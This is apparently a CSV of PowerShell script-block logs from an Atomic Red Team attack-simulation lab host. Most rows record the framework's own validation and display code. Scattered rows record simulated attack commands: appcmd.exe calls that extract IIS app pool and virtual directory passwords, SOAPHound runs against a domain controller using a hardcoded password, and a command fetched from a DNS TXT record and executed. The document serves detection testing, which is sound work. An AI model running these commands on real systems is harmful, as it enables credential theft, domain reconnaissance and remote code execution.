                        return
                    }

                    if (-not ($AtomicTest['input_arguments'][$InputArgName]['description'] -is [String])) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].description' element must be a string.""
                        return
                    }

                    $InputArgument.description = $AtomicTest['input_arguments'][$InputArgName]['description']

                    if (-not $AtomicTest['input_arguments'][$InputArgName].ContainsKey('type')) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].type' element is required.""
                        return
                    }

                    if ($ValidInputArgTypes -notcontains $AtomicTest['input_arguments'][$InputArgName]['type']) {
                        Write-Warning ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].type': '$($AtomicTest['input_arguments'][$InputArgName]['type'])' should be one of the following: $($ValidInputArgTypes -join ', ')""
                    }

                    $InputArgument.type = $AtomicTest['input_arguments'][$InputArgName]['type']

                    if (-not $AtomicTest['input_arguments'][$InputArgName].ContainsKey('default')) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].input_arguments['$InputArgName'].default' element is required.""
                        return
                    }

                    $InputArgument.default = $AtomicTest['input_arguments'][$InputArgName]['default']

                    $InputArguments[$InputArgName] = $InputArgument

                    $j++
                }
            }

            $AtomicTestInstance.input_arguments = $InputArguments

            if (-not $AtomicTest.ContainsKey('executor')) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor' element is required.""
                return
            }

            if (-not ($AtomicTest['executor'] -is [Hashtable])) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor' element must be a hashtable.""
                return
            }

            if (-not $AtomicTest['executor'].ContainsKey('name')) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.name' element is required.""
                return
            }

            if (-not ($AtomicTest['executor']['name'] -is [String])) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description.name' element must be a string.""
                return
            }

            if ($AtomicTest['executor']['name'] -notmatch '^(?-i:[a-z_]+)$') {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description.name' element must be lowercased and underscored.""
                return
            }

            if ($ValidExecutorTypes -notcontains $AtomicTest['executor']['name']) {
                Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].description.name': '$($AtomicTest['executor']['name'])' must be one of the following: $($ValidExecutorTypes -join ', ')""
                return
            }

            if ($AtomicTest['executor']['name'] -eq 'manual') {
                if (-not $AtomicTest['executor'].ContainsKey('steps')) {
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.steps' element is required when the 'manual' executor is used.""
                    return
                }

                if (-not ($AtomicTest['executor']['steps'] -is [String])) {
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.steps' element must be a string.""
                    return
                }

                $ExecutorInstance = [AtomicExecutorManual]::new()
                $ExecutorInstance.steps = $AtomicTest['executor']['steps']
                $StringsWithPotentialInputArgs.Add($AtomicTest['executor']['steps'])
            }
            else {
                if (-not $AtomicTest['executor'].ContainsKey('command')) {
             ","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","2",""
"12/16/2024 8:34:55 PM","35710679","1",", Get","Get [Score: 1]","4911","       Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.command' element is required when the '$($ValidExecutorTypes -join ', ')' executors are used.""
                    return
                }

                if (-not ($AtomicTest['executor']['command'] -is [String])) {
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.command' element must be a string.""
                    return
                }

                $ExecutorInstance = [AtomicExecutorDefault]::new()
                $ExecutorInstance.command = $AtomicTest['executor']['command']
                $StringsWithPotentialInputArgs.Add($AtomicTest['executor']['command'])
            }

            # cleanup_command element is optional
            if ($AtomicTest['executor'].ContainsKey('cleanup_command')) {
                $ExecutorInstance.cleanup_command = $AtomicTest['executor']['cleanup_command']
                $StringsWithPotentialInputArgs.Add($AtomicTest['executor']['cleanup_command'])
            }

            # elevation_required element is optional
            if ($AtomicTest['executor'].ContainsKey('elevation_required')) {
                if (-not ($AtomicTest['executor']['elevation_required'] -is [Bool])) {
                    Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] 'atomic_tests[$i].executor.elevation_required' element must be a boolean.""
                    return
                }

                $ExecutorInstance.elevation_required = $AtomicTest['executor']['elevation_required']
            }
            else {
                # if elevation_required is not present, default to false
                $ExecutorInstance.elevation_required = $False
            }

            $InputArgumentNames = $null

            # Get all input argument names
            $InputArgumentNames = $InputArguments.Keys

            # Extract all input arguments names from the executor
            # Potential places where input arguments can be populated:
            #  - Dependency description
            #  - Dependency prereq_command
            #  - Dependency get_prereq_command
            #  - Executor steps
            #  - Executor command
            #  - Executor cleanup_command

            $Regex = [Regex] '#\{(?<ArgName>[^}]+)\}'
            [String[]] $InputArgumentNamesFromExecutor = $StringsWithPotentialInputArgs |
            ForEach-Object { $Regex.Matches($_) } |
            Select-Object -ExpandProperty Groups |
            Where-Object { $_.Name -eq 'ArgName' } |
            Select-Object -ExpandProperty Value |
            Sort-Object -Unique


            # Validate that all executor input arg names are defined input arg names.
            if ($InputArgumentNamesFromExecutor.Count) {
                $InputArgumentNamesFromExecutor | ForEach-Object {
                    if ($InputArgumentNames -notcontains $_) {
                        Write-Error ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] The following input argument was specified but is not defined: '$_'""
                        return
                    }
                }
            }

            # Validate that all defined input args are utilized at least once in the executor.
            if ($InputArgumentNames.Count) {
                $InputArgumentNames | ForEach-Object {
                    if ($InputArgumentNamesFromExecutor -notcontains $_) {
                        # Write a warning since this scenario is not considered a breaking change
                        Write-Warning ""$ErrorStringPrefix[Atomic test name: $($AtomicTestInstance.name)] The following input argument is defined but not utilized: '$_'.""
                    }
                }
            }

            $ExecutorInstance.name = $AtomicTest['executor']['name']

            $AtomicTestInstance.executor = $ExecutorInstance

            $AtomicTests[$i] = $AtomicTestInstance
        }

        $AtomicInstance.atomic_tests = $AtomicTests

        $AtomicInstance
    }
}


# Tab completion for Atomic Tests
function Get-TechniqueNumbers {
    $PathToAtomicsFolder = if ($IsLinux -or $IsMacOS) { $Env:HOME + ""/AtomicRedTeam/atomics"" } else { $env:HOMEDRIVE + ""\AtomicRedTeam\atomics"" }
    $techniqueNumbers = Get-ChildItem $PathToAtomicsFolder -Directory |
    ForEach-Object { $_.BaseName }

    return $techniqueNumbers
}

Register-ArgumentCompleter -CommandName 'Invoke-AtomicTest' -ParameterName 'AtomicTechnique' -ScriptBlock {
    param($commandName, $parameterName, $wordToComplete, $commandAst, $fakeBoundParameter)

    Get-TechniqueNumbers | Where-Object { $_ -like ""$wordToComplete*"" } |
    ForEach-Object {
        New-Object System.Management.Automation.CompletionResult $_, $_, 'ParameterValue', ""Technique number $_""
    }
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","2","2",""
"12/16/2024 8:34:56 PM","35710857","1",", Get","Get [Score: 1]","1699","function Start-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $commandLine, $isWindows) {

}

function Write-ExecutionLog($startTime, $stopTime, $technique, $testNum, $testName, $testGuid, $testExecutor, $testDescription, $command, $logPath, $targetHostname, $targetUser, $res, $isWindows) {
    $timeUTC = (Get-Date($startTime).toUniversalTime() -uformat ""%Y-%m-%dT%H:%M:%SZ"").ToString()
    $timeLocal = (Get-Date($startTime) -uformat ""%Y-%m-%dT%H:%M:%SZ"").ToString()
    $ipAddress = Get-PreferredIPAddress $isWindows

    $msg = [PSCustomObject][ordered]@{
        ""Execution Time (UTC)""   = $timeUTC
        ""Execution Time (Local)"" = $timeLocal
        ""Technique""              = $technique
        ""Test Number""            = $testNum
        ""Test Name""              = $testName
        ""Hostname""               = $targetHostname
        ""IP Address""             = $ipAddress
        ""Username""               = $targetUser
        ""GUID""                   = $testGuid
        ""Tag""                    = ""atomicrunner""
        ""CustomTag""              = $artConfig.CustomTag
        ""ProcessId""              = $res.ProcessId
        ""ExitCode""               = $res.ExitCode
    }

    # send syslog message if a syslog server is defined in Public/config.ps1
    if ([bool]$artConfig.syslogServer -and [bool]$artConfig.syslogPort) {
        $jsonMsg = $msg | ConvertTo-Json -Compress
        Send-SyslogMessage -Server $artConfig.syslogServer -Port $artConfig.syslogPort -Message $jsonMsg -Severity ""Informational"" -Facility ""daemon"" -Transport $artConfig.syslogProtocol
    }
}

function Stop-ExecutionLog($startTime, $logPath, $targetHostname, $targetUser, $isWindows) {

}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:46 PM","35709123","0","","","64","C:\Windows\System32\inetsrv\appcmd.exe list vdir /text:vdir.name","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:55 PM","35710826","0","","","650","function Initialize-Assemblies {
    $requiredTypes = @(
        ""Parser"", ""MergingParser"", ""YamlStream"",
        ""YamlMappingNode"", ""YamlSequenceNode"",
        ""YamlScalarNode"", ""ChainedEventEmitter"",
        ""Serializer"", ""Deserializer"", ""SerializerBuilder"",
        ""StaticTypeResolver""
    )

    $type = ""YamlDotNet.Serialization.Serializer"" -as [type]
    if (!$type) {
        return Load-Assembly
    }

    $yaml = $type.Assembly
    foreach ($i in $requiredTypes){
        if ($i -notin $yaml.DefinedTypes.Name) {
            Throw ""YamlDotNet is loaded but missing required types ($i). Older version installed on system?""
        }
    }
}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:53 PM","35710482","0","","","186","
Import-Module ""C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1"" -Force 
$PSDefaultParameterValues = @{""Invoke-AtomicTest:PathToAtomicsFolder""=""C:\AtomicRedTeam\atomics""}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:53 PM","35710480","0","","","58",". 'C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1'","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:53 PM","35709166","0","","","9","$global:?","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:59 PM","35711133","0","","","9","$global:?","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:57 PM","35711115","0","","","3119","function Invoke-CleanupDescription() {
    $ret1 = $test.description.ToString().trim() -replace '(?<!\n)\n(?!\n)', ' ' #replace single linefeeds with a space
    $ret1 -replace '\n\n', ""`n"" #replace double linefeeds with a single linefeed
}
function Show-Details ($test, $testCount, $technique, $customInputArgs, $PathToAtomicsFolder) {
    # Header info
    $tName = $technique.display_name.ToString() + "" "" + $technique.attack_technique
    Write-Host -ForegroundColor Magenta ""[********BEGIN TEST*******]""
    Write-KeyValue ""Technique: ""  $tName
    Write-KeyValue ""Atomic Test Name: "" $test.name.ToString()
    Write-KeyValue ""Atomic Test Number: "" $testCount
    if ($test.auto_generated_guid) { Write-KeyValue ""Atomic Test GUID: "" $test.auto_generated_guid }
    Write-KeyValue ""Description: "" $(Invoke-CleanupDescription $test)

    # Attack Commands
    Write-Host -ForegroundColor Yellow ""`nAttack Commands:""
    $elevationRequired = $false
    if ($nul -ne $test.executor.elevation_required ) { $elevationRequired = $test.executor.elevation_required }
    $executor_name = $test.executor.name
    Write-KeyValue ""Executor: "" $executor_name
    Write-KeyValue ""ElevationRequired: "" $elevationRequired
    $final_command = Merge-InputArgs $test.executor.command $test $customInputArgs $PathToAtomicsFolder
    Write-KeyValue ""Command:`n"" $test.executor.command.trim()
    if ($test.executor.command -ne $final_command) { Write-KeyValue ""Command (with inputs):`n"" $final_command.trim() }

    # Cleanup Commands
    if ($nul -ne $test.executor.cleanup_command) {
        Write-Host -ForegroundColor Yellow ""`nCleanup Commands:""
        $final_command = Merge-InputArgs $test.executor.cleanup_command $test $customInputArgs $PathToAtomicsFolder
        Write-KeyValue ""Command:`n"" $test.executor.cleanup_command.trim()
        if ($test.executor.cleanup_command -ne $final_command) { Write-KeyValue ""Command (with inputs):`n"" $final_command.trim() }
    }

    # Dependencies
    if ($nul -ne $test.dependencies) {
        Write-Host -ForegroundColor Yellow ""`nDependencies:""
        foreach ($dep in $test.dependencies) {
            $final_command_prereq = Merge-InputArgs $dep.prereq_command $test $customInputArgs $PathToAtomicsFolder
            $final_command_get_prereq = Merge-InputArgs $dep.get_prereq_command $test $customInputArgs $PathToAtomicsFolder
            $description = Merge-InputArgs $dep.description $test $customInputArgs $PathToAtomicsFolder
            Write-KeyValue ""Description: "" $description.trim()
            Write-KeyValue ""Check Prereq Command:`n"" $dep.prereq_command.trim()
            if ( $dep.prereq_command -ne $final_command_prereq ) { Write-KeyValue ""Check Prereq Command (with inputs):`n"" $final_command_prereq.trim() }
            Write-KeyValue ""Get Prereq Command:`n"" $dep.get_prereq_command.trim()
            if ( $dep.get_prereq_command -ne $final_command_get_prereq ) { Write-KeyValue ""Get Prereq Command (with inputs):`n"" $final_command_get_prereq.trim() }
        }
    }
    # Footer
    Write-Host -ForegroundColor Magenta ""[!!!!!!!!END TEST!!!!!!!]`n`n""

}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:46 PM","35709143","0","","","4","{$_}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:46 PM","35709138","0","","","76","C:\Windows\System32\inetsrv\appcmd.exe list vdir ""WebShells/"" /text:password","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:45 PM","35709066","0","","","16","$Env:SystemDrive","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:57 PM","35711129","0","","","180","{C:\AtomicRedTeam\atomics\T1059.001\bin\SOAPHound.exe --user $($env:USERNAME)@$($env:USERDOMAIN) --password P@ssword1 --dc 10.0.1.14 --buildcache --cachefilename c:\temp\cache.txt}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:46 PM","35709118","0","","","95","C:\Windows\System32\inetsrv\appcmd.exe list apppool ""WebShellsPool"" /text:processmodel.password","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:55 PM","35710845","0","","","1266","class AtomicDependency {
    [String] $description
    [String] $prereq_command
    [String] $get_prereq_command
}

class AtomicInputArgument {
    [String] $description
    [String] $type
    [String] $default
}

class AtomicExecutorBase {
    [String] $name
    [Bool] $elevation_required

    # Implemented to facilitate improved PS object display
    [String] ToString() {
        return $this.Name
    }
}

class AtomicExecutorDefault : AtomicExecutorBase {
    [String] $command
    [String] $cleanup_command
}

class AtomicExecutorManual : AtomicExecutorBase {
    [String] $steps
    [String] $cleanup_command
}

class AtomicTest {
    [String] $name
    [String] $auto_generated_guid
    [String] $description
    [String[]] $supported_platforms
    # I wish this didn't have to be a hashtable but I don't
    # want to change the schema and introduce a breaking change.
    [Hashtable] $input_arguments
    [String] $dependency_executor_name
    [AtomicDependency[]] $dependencies
    [AtomicExecutorBase] $executor

    # Implemented to facilitate improved PS object display
    [String] ToString() {
        return $this.name
    }
}

class AtomicTechnique {
    [String[]] $attack_technique
    [String] $display_name
    [AtomicTest[]] $atomic_tests
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:57 PM","35711127","0","","","182","& {C:\AtomicRedTeam\atomics\T1059.001\bin\SOAPHound.exe --user $($env:USERNAME)@$($env:USERDOMAIN) --password P@ssword1 --dc 10.0.1.14 --buildcache --cachefilename c:\temp\cache.txt}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:46 PM","35709087","0","","","63","C:\Windows\System32\inetsrv\appcmd.exe list apppools /text:name","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:46 PM","35709135","0","","","76","C:\Windows\System32\inetsrv\appcmd.exe list vdir ""WebShells/"" /text:userName","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:46 PM","35709130","0","","","83","C:\Windows\System32\inetsrv\appcmd.exe list vdir ""Default Web Site/"" /text:password","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:57 PM","35711121","0","","","591","function Write-PrereqResults ($FailureReasons, $testId) {
    if ($FailureReasons.Count -eq 0) {
        Write-KeyValue ""Prerequisites met: "" $testId
    }
    else {
        Write-Host -ForegroundColor Red ""Prerequisites not met: $testId""
        foreach ($reason in $FailureReasons) {
            Write-Host -ForegroundColor Yellow -NoNewline ""`t[*] $reason""
        }
        Write-Host -ForegroundColor Yellow -NoNewline ""`nTry installing prereq's with the ""
        Write-Host -ForegroundColor Cyan -NoNewline ""-GetPrereqs""
        Write-Host -ForegroundColor Yellow  "" switch""
    }
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:46 PM","35709091","0","","","96","C:\Windows\System32\inetsrv\appcmd.exe list apppool ""DefaultAppPool"" /text:processmodel.username","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:46 PM","35709094","0","","","96","C:\Windows\System32\inetsrv\appcmd.exe list apppool ""DefaultAppPool"" /text:processmodel.password","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:46 PM","35709099","0","","","99","C:\Windows\System32\inetsrv\appcmd.exe list apppool "".NET v4.5 Classic"" /text:processmodel.username","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:46 PM","35709102","0","","","99","C:\Windows\System32\inetsrv\appcmd.exe list apppool "".NET v4.5 Classic"" /text:processmodel.password","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:46 PM","35709107","0","","","91","C:\Windows\System32\inetsrv\appcmd.exe list apppool "".NET v4.5"" /text:processmodel.username","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:46 PM","35709110","0","","","91","C:\Windows\System32\inetsrv\appcmd.exe list apppool "".NET v4.5"" /text:processmodel.password","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:46 PM","35709115","0","","","95","C:\Windows\System32\inetsrv\appcmd.exe list apppool ""WebShellsPool"" /text:processmodel.username","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:57 PM","35711118","0","","","392","function Write-KeyValue ($key, $value) {
    Write-Host -ForegroundColor Cyan -NoNewline $key
    $split = $value -split ""(#{[a-z-_A-Z]*})""
    foreach ($s in $split) {
        if ($s -match ""(#{[a-z-_A-Z]*})"") {
            Write-Host -ForegroundColor Red -NoNewline $s
        }
        else {
            Write-Host -ForegroundColor Green -NoNewline $s
        }
    }
    Write-Host """"
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:46 PM","35709077","0","","","4","{$_}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:46 PM","35709127","0","","","83","C:\Windows\System32\inetsrv\appcmd.exe list vdir ""Default Web Site/"" /text:userName","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:55 PM","35710748","0","","","8",". whoami","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:55 PM","35710812","0","","","186","
Import-Module ""C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1"" -Force 
$PSDefaultParameterValues = @{""Invoke-AtomicTest:PathToAtomicsFolder""=""C:\AtomicRedTeam\atomics""}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:56 PM","35710939","0","","","213","& {C:\AtomicRedTeam\atomics\T1059.001\bin\SOAPHound.exe --user $env:USERNAME --password P@ssword1 --domain $env:USERDOMAIN --dc 10.0.1.14 --bhdump --cachefilename c:\temp\cache.txt --outputdirectory c:\temp\test2}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:55 PM","35710654","0","","","1266","class AtomicDependency {
    [String] $description
    [String] $prereq_command
    [String] $get_prereq_command
}

class AtomicInputArgument {
    [String] $description
    [String] $type
    [String] $default
}

class AtomicExecutorBase {
    [String] $name
    [Bool] $elevation_required

    # Implemented to facilitate improved PS object display
    [String] ToString() {
        return $this.Name
    }
}

class AtomicExecutorDefault : AtomicExecutorBase {
    [String] $command
    [String] $cleanup_command
}

class AtomicExecutorManual : AtomicExecutorBase {
    [String] $steps
    [String] $cleanup_command
}

class AtomicTest {
    [String] $name
    [String] $auto_generated_guid
    [String] $description
    [String[]] $supported_platforms
    # I wish this didn't have to be a hashtable but I don't
    # want to change the schema and introduce a breaking change.
    [Hashtable] $input_arguments
    [String] $dependency_executor_name
    [AtomicDependency[]] $dependencies
    [AtomicExecutorBase] $executor

    # Implemented to facilitate improved PS object display
    [String] ToString() {
        return $this.name
    }
}

class AtomicTechnique {
    [String[]] $attack_technique
    [String] $display_name
    [AtomicTest[]] $atomic_tests
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:56 PM","35710941","0","","","211","{C:\AtomicRedTeam\atomics\T1059.001\bin\SOAPHound.exe --user $env:USERNAME --password P@ssword1 --domain $env:USERDOMAIN --dc 10.0.1.14 --bhdump --cachefilename c:\temp\cache.txt --outputdirectory c:\temp\test2}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:56 PM","35710945","0","","","9","$global:?","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:54 PM","35710635","0","","","650","function Initialize-Assemblies {
    $requiredTypes = @(
        ""Parser"", ""MergingParser"", ""YamlStream"",
        ""YamlMappingNode"", ""YamlSequenceNode"",
        ""YamlScalarNode"", ""ChainedEventEmitter"",
        ""Serializer"", ""Deserializer"", ""SerializerBuilder"",
        ""StaticTypeResolver""
    )

    $type = ""YamlDotNet.Serialization.Serializer"" -as [type]
    if (!$type) {
        return Load-Assembly
    }

    $yaml = $type.Assembly
    foreach ($i in $requiredTypes){
        if ($i -notin $yaml.DefinedTypes.Name) {
            Throw ""YamlDotNet is loaded but missing required types ($i). Older version installed on system?""
        }
    }
}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:56 PM","35710997","0","","","58",". 'C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1'","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:56 PM","35710999","0","","","186","
Import-Module ""C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1"" -Force 
$PSDefaultParameterValues = @{""Invoke-AtomicTest:PathToAtomicsFolder""=""C:\AtomicRedTeam\atomics""}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:56 PM","35711013","0","","","650","function Initialize-Assemblies {
    $requiredTypes = @(
        ""Parser"", ""MergingParser"", ""YamlStream"",
        ""YamlMappingNode"", ""YamlSequenceNode"",
        ""YamlScalarNode"", ""ChainedEventEmitter"",
        ""Serializer"", ""Deserializer"", ""SerializerBuilder"",
        ""StaticTypeResolver""
    )

    $type = ""YamlDotNet.Serialization.Serializer"" -as [type]
    if (!$type) {
        return Load-Assembly
    }

    $yaml = $type.Assembly
    foreach ($i in $requiredTypes){
        if ($i -notin $yaml.DefinedTypes.Name) {
            Throw ""YamlDotNet is loaded but missing required types ($i). Older version installed on system?""
        }
    }
}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:54 PM","35710621","0","","","186","
Import-Module ""C:\AtomicRedTeam\invoke-atomicredteam\Invoke-AtomicRedTeam.psd1"" -Force 
$PSDefaultParameterValues = @{""Invoke-AtomicTest:PathToAtomicsFolder""=""C:\AtomicRedTeam\atomics""}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:54 PM","35710619","0","","","58",". 'C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1'","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:54 PM","35710613","0","","","90","function nslookup { &""$env:windir\system32\nslookup.exe"" @args | Out-Null; @("""",""whoami"")}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:54 PM","35710611","0","","","326","{# creating a custom nslookup function that will indeed call nslookup but forces the result to be ""whoami""
# this would not be part of a real attack but helpful for this simulation
function nslookup { &""$env:windir\system32\nslookup.exe"" @args | Out-Null; @("""",""whoami"")}
powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:54 PM","35710609","0","","","328","& {# creating a custom nslookup function that will indeed call nslookup but forces the result to be ""whoami""
# this would not be part of a real attack but helpful for this simulation
function nslookup { &""$env:windir\system32\nslookup.exe"" @args | Out-Null; @("""",""whoami"")}
powershell .(nslookup -q=txt example.com 8.8.8.8)[-1]}","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:54 PM","35710603","0","","","591","function Write-PrereqResults ($FailureReasons, $testId) {
    if ($FailureReasons.Count -eq 0) {
        Write-KeyValue ""Prerequisites met: "" $testId
    }
    else {
        Write-Host -ForegroundColor Red ""Prerequisites not met: $testId""
        foreach ($reason in $FailureReasons) {
            Write-Host -ForegroundColor Yellow -NoNewline ""`t[*] $reason""
        }
        Write-Host -ForegroundColor Yellow -NoNewline ""`nTry installing prereq's with the ""
        Write-Host -ForegroundColor Cyan -NoNewline ""-GetPrereqs""
        Write-Host -ForegroundColor Yellow  "" switch""
    }
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:54 PM","35710600","0","","","392","function Write-KeyValue ($key, $value) {
    Write-Host -ForegroundColor Cyan -NoNewline $key
    $split = $value -split ""(#{[a-z-_A-Z]*})""
    foreach ($s in $split) {
        if ($s -match ""(#{[a-z-_A-Z]*})"") {
            Write-Host -ForegroundColor Red -NoNewline $s
        }
        else {
            Write-Host -ForegroundColor Green -NoNewline $s
        }
    }
    Write-Host """"
}
","ar-win-5.attackrange.local","S-1-5-21-1731938146-2314223186-1848411941-500","1","1",""
"12/16/2024 8:34:54 PM","35710597","0","","","3119","function Invoke-CleanupDescription() {
    $ret1 = $test.description.ToString().trim() -replace '(?<!\n)\n(?!\n)', ' ' #replace single linefeeds with a space
    $ret1 -replace '\n\n', ""`n"" #replace double linefeeds with a single linefeed
}
function Show-Details ($test, $testCount, $technique, $customInputArgs, $PathToAtomicsFolder) {
    # Header info
    $tName = $technique.display_name.ToString() + "" "" + $technique.attack_technique
    Write-Host -ForegroundColor Magenta ""[********BEGIN TEST*******]""
    Write-KeyValue ""Technique: ""  $tName
    Write-KeyValue ""Atomic Test Name: "" $test.name.ToString()
    Write-KeyValue ""Atomic Test Number: "" $testCount
    if ($test.auto_generated_guid) { Write-KeyValue ""Atomic Test GUID: "" $test.auto_generated_guid }
    Write-KeyValue ""Description: "" $(Invoke-CleanupDescription $test)

    # Attack Commands
    Write-Host -ForegroundColor Yellow ""`nAttack Commands:""
    $elevationRequired = $false
    if ($nul -ne $test.executor.elevation_required ) { $elevationRequired = $test.executor.elevation_required }
    $executor_name = $test.executor.name
    Write-KeyValue ""Executor: "" $executor_name
    Write-KeyValue ""ElevationRequired: "" $elevationRequired
    $final_command = Merge-InputArgs $test.executor.command $test $customInputArgs $PathToAtomicsFolder
    Write-KeyValue ""Command:`n"" $test.executor.command.trim()
    if ($test.executor.command -ne $final_command) { Write-KeyValue ""Command (with inputs):`n"" $final_command.trim() }

    # Cleanup Commands
    if ($nul -ne $test.executor.cleanup_command) {
        Write-Host -ForegroundColor Yellow ""`nCleanup Commands:""
        $final_command = Merge-InputArgs $test.executor.cleanup_command $test $customInputArgs $PathToAtomicsFolder
